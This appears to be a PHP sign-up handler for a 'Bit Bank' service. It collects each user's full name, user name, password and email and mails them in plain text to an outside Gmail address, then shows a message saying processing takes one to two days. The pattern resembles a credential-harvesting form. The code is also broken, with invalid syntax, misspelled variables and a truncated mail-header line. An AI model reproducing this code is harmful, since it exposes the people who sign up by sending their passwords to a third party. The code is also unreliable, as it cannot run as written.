<?php
 if(isset($_POST['mail'])){
  $email_send_to = "nextrevoultuion@gmail.com";
  $email_from = "bitbank@evergenco.us";
  $subject = "Sign Up for Bit Bank";
  
  function died($error) {
        echo "We are very sorry, but there were error(s) found with the form you submitted. ";
 
        echo "These errors appear below.<br /><br />";
 
        echo $error."<br /><br />";
 
        echo "Please go back and fix these errors.<br /><br />";
 
        die();
 }  
  
  if(!isset($_POST['full_name']) ||
     !isset($_POST['user_name']) ||
     !isset($_POST['password']) ||
     !isset($_POST['email_address'])){
      died('Sorry the infromation you entered was invalid. Please try again!');
     }
     
  $full_name = $_POST['full_name'];
  $user_name = $_POST['user_name'];
  $password = $_POST['password'];
  $email_address = $_POST['email_address'];
  
  $error_message = "";      
  $email_exp = '/^[A-Za-z0-9._%-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,4}$/';   

  if!(!preg_match($email_exp, $email_address)){
   error.msg .= "The Email Address Is Invalid";
  }
  
  $email_message = "Details Below. \n\n";  
  function clean_string($string) {
   $bad = array("content-type","bcc:","to:","cc:","href");
   return str_replace($bad,"",$string);
  }
  $email_message .= "Full Name: ".clean_string($full_name)."\n";
  $email_message .= "User Name: ".clean_string($user_name)."\n";
  $email_message .= "Password: ".clean_string($password)."\n";
  $email_message .= "Email: ".clean_string($email_address)."\n";
  
  $headers = 'From: '.$eamil_from."\r\n";
  'X-Mailer: PHP/'.phpversion();
  @mail($email_send_to, $subject, $email_message, $headers);
?>
<html>
 <div align="center"><h1>Sign Up Form Will Be Proccessed. It Will Take From One - to - Two Days. !!Thank You For Your Cooporation</h1></div>
 <a href="http://www.evergenco.us">Back Home</a>
</html>
<?php
 }
?>